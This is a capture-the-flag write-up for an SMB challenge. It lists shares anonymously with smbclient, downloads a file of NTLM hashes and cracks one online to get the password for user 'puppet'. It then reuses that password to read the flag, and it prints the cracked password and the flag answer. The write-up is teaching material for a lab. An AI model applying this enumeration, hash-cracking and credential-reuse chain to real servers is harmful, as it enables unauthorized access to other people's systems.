---
title: reto14
challenge_type: Crypto
difficulty: Medium
author: "@4nimanegra"
writeup_author: "@xabito"
competition: navarra-cyber-talent-25-4
summary: |-
  The flag is stored in a shared SMB directory.
connections:
  - url: smb://nct25.thehackerconclave.es:26014
---

**Note:** This solution exploits a flaw in the SMB user credentials and is not the expected method for solving this challenge. For the intended solution, see [reto14 (The Intended Way™)](/competitions/navarra-cyber-talent-25-4/reto14-intended/).

## Recon

The challenge description indicates that the flag is stored on an SMB share. As a first step, I enumerated the available SMB shares on the target server without authentication using `smbclient`:

```bash
$ smbclient -L nct25.thehackerconclave.es -p 26014 -N
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
hashes          Disk
flag            Disk
IPC$            IPC       IPC Service (Samba 4.22.4-Debian-4.22.4+dfsg-1~deb13u1)
nobody          Disk      Home Directories
```

Among the available shares, `hashes` and `flag` seemed most relevant to the challenge. I first attempted to list the contents of the `flag` share.

```bash
$ smbclient //nct25.thehackerconclave.es/flag -p 26014 -N -c 'ls'
tree connect failed: NT_STATUS_ACCESS_DENIED
```

It appears that anonymous access to the `flag` share is not permitted. Therefore, I next tried accessing the `hashes` share without authentication to see what information could be obtained.

```bash
$ smbclient //nct25.thehackerconclave.es/hashes -p 26014 -N -c 'ls'
.              D       0  Thu Oct 23 10:46:55 2025
..             D       0  Thu Oct 23 10:46:55 2025
hashes.txt     N    1679  Thu Oct 16 11:30:43 2025
.DS_Store     AH       0  Thu Oct 23 10:46:52 2025
```

The `hashes` share was accessible without authentication and contained a file named `hashes.txt`. I proceeded to download this file:

```bash
$ smbclient //nct25.thehackerconclave.es/hashes -p 26014 -N -c 'get hashes.txt'
getting file \hashes.txt of size 1679 as hashes.txt (13.4 KiloBytes/sec) (average 13.4 KiloBytes/sec)

$ cat hashes.txt
ec2-user:1782:aad3b435b51404eeaad3b435b51404ee:1e8c4f496d8366264f9af55531e10946:::
adm:1343:aad3b435b51404eeaad3b435b51404ee:cfab9484afdec2d80d471f37b574cd90:::
puppet:5161:aad3b435b51404eeaad3b435b51404ee:f5e1a40b0d715eda27b3de998cd3fa39:::
adm:3041:aad3b435b51404eeaad3b435b51404ee:a6a268f489e0356e052592b34931b819:::
adm:8063:aad3b435b51404eeaad3b435b51404ee:d419c4457700f00f3844d47029cb13b0:::
root:7410:aad3b435b51404eeaad3b435b51404ee:173114edcbd8204f3ad5718096bda957:::
info:5427:aad3b435b51404eeaad3b435b51404ee:a7235c16f9e8142dbe0fd4aad2837d5f:::
admin:2584:aad3b435b51404eeaad3b435b51404ee:3109bead2b4d852696e6e91310c94f0e:::
guest:4544:aad3b435b51404eeaad3b435b51404ee:29c86cdfa8e80446907b1b8344161e8c:::
vagrant:4816:aad3b435b51404eeaad3b435b51404ee:8a75a0218868929aa32b3382a02cb3f7:::
user:818:aad3b435b51404eeaad3b435b51404ee:1c2bae33cfbb5072d73371ab30ff989a:::
ftp:4999:aad3b435b51404eeaad3b435b51404ee:d2e886f097fc6c48605ef37b084136f3:::
puppet:3674:aad3b435b51404eeaad3b435b51404ee:ff3a2ed8359f43548db33d20ea107849:::
root:9075:aad3b435b51404eeaad3b435b51404ee:4f218d10f9a6c7a7d38c7bba1780aff2:::
info:7314:aad3b435b51404eeaad3b435b51404ee:f88b95b0d93761c752c2383deee0b029:::
test:4091:aad3b435b51404eeaad3b435b51404ee:ec94558afaae4a163fe3709c651f68c0:::
azureuser:1514:aad3b435b51404eeaad3b435b51404ee:a62e3392f80c8ecb6c222d5c932441a1:::
admin:6548:aad3b435b51404eeaad3b435b51404ee:5764aec39ea4cdba6c6c84a16de434a7:::
vagrant:5151:aad3b435b51404eeaad3b435b51404ee:1979c40670b37dd4aa62a9d2faabfc26:::
vagrant:4082:aad3b435b51404eeaad3b435b51404ee:1f7fcb8a2d88982b5b493d32eca8d11c:::
test:3543:aad3b435b51404eeaad3b435b51404ee:bc1fec2270fbd3c021d99a74e4fbf59f:::
```

## Exploitation

The `hashes.txt` file included several user entries, each following the format `username:uid:LM_hash:NTLM_hash:::`. Before considering using `hashcat`, it is wise to first check if any of these hashes have already been cracked using free online hash lookup services. I submitted all the hashes to [CrackStation](https://crackstation.net):

![Hashes](/assets/files/navarra-cyber-talent-25-4/reto14/hashes.png)

Fortunately, the password for the `puppet` user was found online. It is `TzqF`. We can use these credentials to access and download the flag.

## Flag capture

After obtaining valid credentials, I proceeded to access the `flag` share:

```bash
$ smbclient //nct25.thehackerconclave.es/flag -p 26014 -U puppet%TzqF -c 'ls'
.              D       0  Thu Oct 16 11:30:43 2025
..             D       0  Thu Oct 16 11:30:43 2025
flag.txt       N      43  Thu Oct 16 11:30:43 2025
```

Using the authenticated session, I downloaded the flag file as follows:

```bash
$ smbclient //nct25.thehackerconclave.es/flag -p 26014 -U puppet%TzqF -c 'get flag.txt'
getting file \flag.txt of size 43 as flag.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)

$ cat flag.txt
conclave{485ba08b43cef28a7cafbfeb0944d59b}
```